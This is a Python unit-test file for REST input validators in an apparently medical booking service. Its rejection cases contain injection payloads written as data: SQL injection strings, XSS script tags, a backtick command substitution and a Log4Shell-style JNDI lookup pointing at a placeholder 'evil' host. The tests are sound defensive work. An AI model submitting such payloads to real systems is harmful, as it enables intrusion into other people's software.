"""Tests unitaires pour la validation des paramètres d'entrée REST (Item 18)."""

from input_validators import (
    validate_date,
    validate_doctor_code,
    validate_period,
    validate_phone,
    validate_pin,
    validate_reason_code,
    validate_safe_text,
    validate_time,
)


def test_validate_phone_valid():
    assert validate_phone("0340000000") is True
    assert validate_phone("+261340000000") is True
    assert validate_phone("034 12 345 67") is True
    assert validate_phone("+33 6 12 34 56 78") is True


def test_validate_phone_invalid():
    assert validate_phone("") is False
    assert validate_phone("123") is False
    assert validate_phone("0340000000; DROP TABLE") is False
    assert validate_phone("<script>alert(1)</script>") is False
    assert validate_phone("not_a_phone") is False


def test_validate_date():
    assert validate_date("2026-11-23") is True
    assert validate_date("2099-12-31") is True
    assert validate_date("2026-13-01") is False
    assert validate_date("2026-00-10") is False
    assert validate_date("invalid-date") is False
    assert validate_date("2026-11-23' OR '1'='1") is False


def test_validate_time():
    assert validate_time("08:00") is True
    assert validate_time("23:59") is True
    assert validate_time("24:00") is False
    assert validate_time("08:60") is False
    assert validate_time("8:00") is False
    assert validate_time("08:00; DROP") is False


def test_validate_doctor_code():
    assert validate_doctor_code("A") is True
    assert validate_doctor_code("doc_general") is True
    assert validate_doctor_code("dr-martin_1") is True
    assert validate_doctor_code("") is False
    assert validate_doctor_code("doc' OR 1=1--") is False
    assert validate_doctor_code("<script>") is False


def test_validate_period():
    assert validate_period("MAT") is True
    assert validate_period("AM") is True
    assert validate_period("APM") is True
    assert validate_period("SOIR") is False
    assert validate_period("MAT; DROP") is False


def test_validate_reason_code():
    assert validate_reason_code("consultation_generale") is True
    assert validate_reason_code("pediatrie") is True
    assert validate_reason_code("motif;--") is False


def test_validate_pin():
    assert validate_pin("123456") is True
    assert validate_pin("000000") is True
    assert validate_pin("12345678") is False
    assert validate_pin("1234") is False
    assert validate_pin("12") is False
    assert validate_pin("12345a") is False
    assert validate_pin("123456' OR '1'='1") is False


def test_validate_safe_text():
    assert validate_safe_text("Jean Dupont") is True
    assert validate_safe_text("Douleurs thoraciques et fièvre légère.") is True
    assert validate_safe_text("<script>alert('XSS')</script>") is False
    assert validate_safe_text("SELECT * FROM users;") is False
    assert validate_safe_text("Hello `whoami`") is False
    assert validate_safe_text("${jndi:ldap://evil}") is False
